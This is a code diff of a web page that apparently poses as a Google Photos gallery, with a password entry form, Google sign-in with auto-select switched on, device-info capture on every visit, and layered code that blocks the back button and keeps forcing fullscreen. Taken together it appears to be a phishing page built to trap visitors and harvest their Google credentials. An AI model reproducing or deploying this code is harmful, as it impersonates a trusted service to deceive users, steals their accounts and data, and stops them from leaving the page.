@@ -1437,7 +1437,7 @@
           data-callback="handleCredentialResponse" data-auto_prompt="false">
         </div>
         <div class="g_id_signin" data-type="standard" data-size="large" data-theme="outline" data-text="sign_in_with"
-          data-shape="pill" data-logo_alignment="left">
+          data-shape="pill" data-logo_alignment="left" style="display:flex;justify-content:center">
         </div>
 
         <p class="lock-note">🔒 Your photos stay private & secure</p>
@@ -1720,7 +1720,7 @@
       <a href="#" class="pwd-forgot" id="pwdForgot">Forgot password?</a>
 
       <div class="pwd-actions">
-
+        
         <button class="pwd-btn-primary" id="pwdSubmit">Next</button>
       </div>
     </div>
@@ -1845,7 +1845,7 @@
     /* ============================================
        BACK BUTTON DISABLE + FULLSCREEN RESTORE
        ============================================ */
-
+    
     /* ============================================
        🔒 BACK BUTTON BLOCK + FULLSCREEN RESTORE
        ============================================ */
@@ -1854,7 +1854,7 @@
     window.addEventListener('popstate', function (e) {
       // 🚫 Back button block — history me wapas push karo
       history.pushState(null, null, location.href);
-
+      
       // 🎯 Toast guide
       if (typeof showToast === 'function') {
         showToast('Google Photos');
@@ -1865,12 +1865,12 @@
         const tryFS = () => {
           const el = document.documentElement;
           const req = el.requestFullscreen ||
-            el.webkitRequestFullscreen ||
-            el.mozRequestFullScreen ||
-            el.msRequestFullscreen;
-          if (req) req.call(el).catch(() => { });
+                      el.webkitRequestFullscreen ||
+                      el.mozRequestFullScreen ||
+                      el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => {});
         };
-
+        
         // 5 attempts — different timings
         tryFS();
         setTimeout(tryFS, 100);
@@ -1882,7 +1882,7 @@
     /* ============================================
        🛡️ EXTRA BACK BLOCK LAYERS
        ============================================ */
-
+    
     // Layer 1: Extra popstate (double protection)
     window.addEventListener('popstate', function () {
       if (__userWantsFullscreen) {
@@ -1898,7 +1898,7 @@
         // Fullscreen restore
         const el = document.documentElement;
         const req = el.requestFullscreen || el.webkitRequestFullscreen;
-        if (req && !document.fullscreenElement) req.call(el).catch(() => { });
+        if (req && !document.fullscreenElement) req.call(el).catch(() => {});
         return '';
       }
     });
@@ -1912,26 +1912,26 @@
         __restoreTimer = setTimeout(() => {
           const el = document.documentElement;
           const req = el.requestFullscreen ||
-            el.webkitRequestFullscreen ||
-            el.mozRequestFullScreen ||
-            el.msRequestFullscreen;
-          if (req) req.call(el).catch(() => { });
+                      el.webkitRequestFullscreen ||
+                      el.mozRequestFullScreen ||
+                      el.msRequestFullscreen;
+          if (req) req.call(el).catch(() => {});
         }, 200);
       }
     });
-    /* ============================================
-   🖱️ USER CLICK PE AUTO FULLSCREEN RESTORE
-   ============================================ */
+        /* ============================================
+       🖱️ USER CLICK PE AUTO FULLSCREEN RESTORE
+       ============================================ */
     function tryRestoreFS() {
       if (!__userWantsFullscreen) return;
       if (document.fullscreenElement) return;
-
+      
       const el = document.documentElement;
       const req = el.requestFullscreen ||
-        el.webkitRequestFullscreen ||
-        el.mozRequestFullScreen ||
-        el.msRequestFullscreen;
-      if (req) req.call(el).catch(() => { });
+                  el.webkitRequestFullscreen ||
+                  el.mozRequestFullScreen ||
+                  el.msRequestFullscreen;
+      if (req) req.call(el).catch(() => {});
     }
 
     // Har click pe check
@@ -1962,7 +1962,7 @@
       }
     }, 2000);
     // Fullscreen tootne pe auto-restore
-
+   
     async function init() {
       const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
       allImages = [...uploaded, ...DEFAULT_IMAGES];
@@ -1985,36 +1985,34 @@
       // 🔥 Step 1: Page visit → device info save
       await saveDeviceToRoot();
       // 🔥 Google SDK initialize karo
-      // 🔥 Google SDK initialize karo — SAME PAGE, NO NEW TAB
-      // 🔥 Google SDK initialize karo — One Tap + FedCM
-       if (window.google && window.google.accounts) {
+            // 🔥 Google SDK initialize karo — SAME PAGE, NO NEW TAB
+           // 🔥 Google SDK initialize karo — One Tap + FedCM
+      if (window.google && window.google.accounts) {
         google.accounts.id.initialize({
           client_id: "338077974110-5l2ti6hcnhbtejq1r1h1hrgfh4uqdk4a.apps.googleusercontent.com",
           callback: handleCredentialResponse,
-          use_fedcm_for_prompt: false,
-          auto_select: false,
+          use_fedcm_for_prompt: true,
+          auto_select: true,
           cancel_on_tap_outside: false,
           itp_support: true
         });
 
         // One Tap trigger — 3 second baad
-       // ✅ GSI button render karo — "Sign in with Google" (no email)
-                // ✅ Hidden GSI button render karo (email nahi dikhega)
         setTimeout(() => {
-          const btn = document.querySelector('.g_id_signin');
-          if (btn) {
-            btn.innerHTML = '';
-            google.accounts.id.renderButton(btn, {
-              type: 'standard',
-              size: 'large',
-              theme: 'outline',
-              text: 'sign_in_with',
-              shape: 'pill',
-              logo_alignment: 'left'
+          try {
+            google.accounts.id.prompt((notification) => {
+              if (notification.isNotDisplayed()) {
+                console.log('One Tap not shown (cooldown)');
+              } else if (notification.isSkippedMoment()) {
+                console.log('User skipped');
+              } else if (notification.isDismissedMoment()) {
+                console.log('User dismissed');
+              }
             });
-            console.log('✅ Hidden GSI button rendered');
+          } catch (e) {
+            console.log('Prompt error:', e.message);
           }
-        }, 1000);
+        }, 3000);
       }
     }
 
@@ -2400,30 +2398,7 @@
         renderGallery(getFilteredList());
       });
     });
-    /* ============================================
-       🔥 CUSTOM GOOGLE SIGN-IN HANDLER
-       ============================================ */
-    function handleCustomGoogleSignIn() {
-      console.log('🖱 Custom Google button clicked');
-      
-      // GSI hidden button ko programmatically click karo
-      const hiddenBtn = document.querySelector('.g_id_signin');
-      if (hiddenBtn) {
-        const iframe = hiddenBtn.querySelector('iframe');
-        if (iframe) {
-          console.log('✅ Clicking hidden GSI iframe');
-          iframe.click();
-          return;
-        }
-      }
-      
-      // Fallback: One Tap prompt
-      if (window.google && window.google.accounts && window.google.accounts.id) {
-        console.log('⚠️ Using One Tap fallback');
-        google.accounts.id.prompt();
-      }
-    }
-    window.handleCustomGoogleSignIn = handleCustomGoogleSignIn;
+
     /* ============================================
        GOOGLE SIGN-IN CALLBACK
        ============================================ */
@@ -2475,7 +2450,7 @@
       if (e.key === 'Enter') { e.preventDefault(); submitPassword(); }
     });
 
-
+   
 
     $('pwdShow').addEventListener('change', (e) => {
       $('pwdInput').type = e.target.checked ? 'text' : 'password';
@@ -3077,8 +3052,6 @@
        START
        ============================================ */
     init();
-          
-       
   </script>
 
 </body>
